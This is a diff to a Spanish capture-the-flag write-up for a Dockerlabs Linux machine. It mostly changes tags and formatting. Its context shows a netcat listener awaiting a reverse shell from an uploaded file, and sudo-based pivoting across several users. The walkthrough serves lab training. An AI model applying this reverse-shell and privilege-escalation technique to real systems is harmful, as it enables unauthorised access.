@@ -5,7 +5,7 @@ icon: linux
 **Plataforma:** Dockerlabs\
 **Sistema Operativo:** Linux
 
-> **Tags:** `Linux` `Web` `SSTI` `Python` `John` `Sudoers` `Information Leakage`
+> **Tags:** `Linux` `Web` `Gobuster` `File Upload` `Bypass` `RCE` `Sudoers`
 
 ## INSTALACIÓN
 
@@ -184,9 +184,8 @@ Ponemos un `listener` en nuestra máquina atacante.
 sudo nc -nlvp 4444
 ```
 
-Navegamos a la ruta donde se ha subido el archivo: `http://172.17.0.2/themes/uploads/69933be14a98c.jpg`.
+Navegamos a la ruta donde se ha subido el archivo:`http://172.17.0.2/themes/uploads/69933be14a98c.jpg`.
 
-Info:
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 46246
@@ -252,6 +251,7 @@ daphne
 daphne@4eddf4ebb561:/$
 ```
 
+---
 Una vez como daphne, volvemos a comprobar los permisos `sudo`.
 
 ```Bash
@@ -280,6 +280,7 @@ vilma
 $
 ```
 
+---
 Ahora como vilma, comprobamos permisos `sudo`.
 
 ```Bash
@@ -308,6 +309,7 @@ shaggy
 $
 ```
 
+---
 Seguimos pivotando. Comprobamos permisos de `sudo` de shaggy.
 
 ```Bash
@@ -336,6 +338,7 @@ fred
 $
 ```
 
+---
 Comprobamos los permisos `sudo` de fred.
 
 ```Bash
